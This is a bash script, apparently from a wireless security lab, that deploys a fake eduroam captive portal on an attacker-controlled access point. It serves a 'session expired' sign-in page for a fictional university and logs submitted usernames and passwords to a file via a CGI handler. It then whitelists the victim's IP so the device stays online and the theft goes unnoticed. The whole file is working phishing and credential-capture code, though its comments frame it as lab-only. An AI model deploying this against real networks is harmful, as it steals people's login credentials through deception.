#!/usr/bin/env bash
# Tier 2.5 - captive-portal credential capture on the attacker path (lab only).
#
# Serves a fake "University of Wipkingen" eduroam sign-in form to edu clients and
# logs whatever username/password they type DIRECTLY (no EAP, no cracking). The OS
# captive-detection probe (captive.apple.com / connectivitycheck) hits the :80
# intercept and auto-pops this page as the native captive sheet - the victim does
# not have to open a browser. The page is framed as a "session expired" re-auth.
#
# Keep-connected: when the victim submits, the login CGI (a) logs the creds and
# (b) adds their IP to the edu_released bypass set (http-intercept.sh), so their
# next captive-portal re-probe skips the :80 intercept and reaches the real
# internet. The OS then sees the network as online, dismisses the sheet, and
# keeps the connection instead of dropping it / disabling auto-join. This needs
# real upstream, so run `edu-path.sh on` first (the CGI releases either way, but
# without upstream the re-probe still fails and the OS will still drop the net).
#
# uni-wipkingen is a FICTIONAL institution (the lab's demo IdP) - this does not
# impersonate a real organisation. Lab only, against your own test device.
#
#   portal.sh on      deploy the login form + CGI capture (turns http-intercept on)
#   portal.sh off     restore the plain non-capturing intercept page
#   portal.sh creds   show captured credentials and copy them into evidence/
#   portal.sh status
#
# Requires an `mango-b` host alias in your ssh config (ProxyJump via mango-a).
set -euo pipefail
MB=${MANGO_B:-mango-b}
SSH=(ssh -o BatchMode=yes "$MB")
HERE="$(cd "$(dirname "$0")" && pwd)"
OUT="evidence/eduroam-attacker"
usage() { echo "usage: $0 on|off|creds|status" >&2; exit 2; }
[ $# -eq 1 ] || usage

case "$1" in
on)
	"${HERE}/http-intercept.sh" on >/dev/null   # ensure the :80 DNAT + edu_released bypass exist
	# Keep-connected only works if the victim has real upstream; warn if not.
	if [ "$("${SSH[@]}" 'uci -q get wireless.eduroam_b3.network')" != "edu" ]; then
		echo "WARNING: edu-path is off (eduroam_b3 not on the edu bridge). The portal will pop," >&2
		echo "         but with no upstream the OS re-probe still fails and the device will drop" >&2
		echo "         the network. Run: lab/eduroam/attacker/edu-path.sh on   to keep victims online." >&2
	fi
	"${SSH[@]}" '
		mkdir -p /www-attacker/cgi-bin
		cat > /www-attacker/index.html <<"HTML"
<!doctype html><html><head><meta charset="utf-8"><title>eduroam-lab sign-in</title>
<!-- LAB DEMO: credential-capture portal; uni-wipkingen is fictional -->
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>body{font:16px system-ui,sans-serif;margin:0;background:#f4f5f7;color:#1a1a1a}
.c{max-width:380px;margin:8vh auto;background:#fff;border-radius:12px;padding:28px;box-shadow:0 2px 16px rgba(0,0,0,.08)}
h1{font-size:19px;margin:0 0 4px}p.s{color:#666;font-size:13px;margin:0 0 20px}
label{display:block;font-size:13px;margin:12px 0 4px}input{width:100%;box-sizing:border-box;padding:11px;border:1px solid #ccc;border-radius:7px;font-size:15px}
button{width:100%;margin-top:18px;padding:12px;border:0;border-radius:7px;background:#0b4da2;color:#fff;font-size:15px}</style>
</head><body><div class="c"><h1>University of Wipkingen</h1><p class="s">Your eduroam session has expired &mdash; sign in again to stay connected</p>
<form method="GET" action="/cgi-bin/login">
<label>Username</label><input name="identity" autocapitalize="none" placeholder="user@uni-wipkingen.ch">
<label>Password</label><input name="password" type="password">
<button type="submit">Reconnect</button></form></div></body></html>
HTML
		# uhttpd here drops the POST body to CGI; capture via GET QUERY_STRING instead.
		cat > /www-attacker/cgi-bin/login <<"CGI"
#!/bin/sh
printf "%s\t%s\t%s\n" "$(date +%Y-%m-%dT%H:%M:%S)" "${REMOTE_ADDR:-?}" "${QUERY_STRING:-}" >> /tmp/portal-creds.log
# Release this victim: add its IP to edu_released so its :80 captive re-probes skip
# the intercept and reach the real internet -> the OS marks the net online and keeps
# it (no drop / auto-join disable). Needs edu-path on for real upstream; nft needs root.
[ -n "${REMOTE_ADDR}" ] && nft add element inet fw4 edu_released "{ ${REMOTE_ADDR} }" 2>/dev/null
# Bounce the OS straight at its own probe URL (now un-intercepted for us) so the
# captive sheet re-checks, sees Success, and closes instead of lingering.
printf "Content-Type: text/html\r\n\r\n<!doctype html><meta charset=utf-8><meta http-equiv=\"refresh\" content=\"1;url=http://captive.apple.com/hotspot-detect.html\"><p style=\"font:16px system-ui;margin:12vh auto;max-width:360px;text-align:center\">Reconnecting to eduroam-lab&hellip;</p>"
CGI
		chmod +x /www-attacker/cgi-bin/login
		uci set uhttpd.attacker.cgi_prefix="/cgi-bin"; uci commit uhttpd
		/etc/init.d/uhttpd restart >/dev/null 2>&1
	'
	echo "portal ON: OS captive sheet pops a 'session expired' uni-wipkingen sign-in; typed creds"
	echo "           logged to /tmp/portal-creds.log on B, then the victim is released (stays online)."
	;;
off)
	# restore the plain (non-capturing) intercept page, drop the CGI
	"${SSH[@]}" '
		rm -f /www-attacker/cgi-bin/login
		uci -q delete uhttpd.attacker.cgi_prefix || true
		uci commit uhttpd
		/etc/init.d/uhttpd restart >/dev/null 2>&1
	'
	"${HERE}/http-intercept.sh" on >/dev/null   # keeps the plain banner page
	echo "portal OFF: back to the plain non-capturing intercept page (http-intercept still on; run http-intercept.sh off to stop that too)."
	;;
creds)
	mkdir -p "$OUT"
	f="$OUT/portal-creds-$(date +%Y%m%d-%H%M%S).log"
	if "${SSH[@]}" 'test -s /tmp/portal-creds.log'; then
		"${SSH[@]}" 'cat /tmp/portal-creds.log' | tee "$f"
		echo "--- copied to $f ---"
	else
		echo "No portal credentials captured yet (/tmp/portal-creds.log empty)."
	fi
	;;
status)
	"${SSH[@]}" '
		echo "cgi enabled   = $(uci -q get uhttpd.attacker.cgi_prefix || echo no)"
		echo "login form    = $([ -f /www-attacker/cgi-bin/login ] && echo deployed || echo absent)"
		echo "captures      = $(wc -l < /tmp/portal-creds.log 2>/dev/null || echo 0) line(s)"
	'
	;;
*) usage ;;
esac
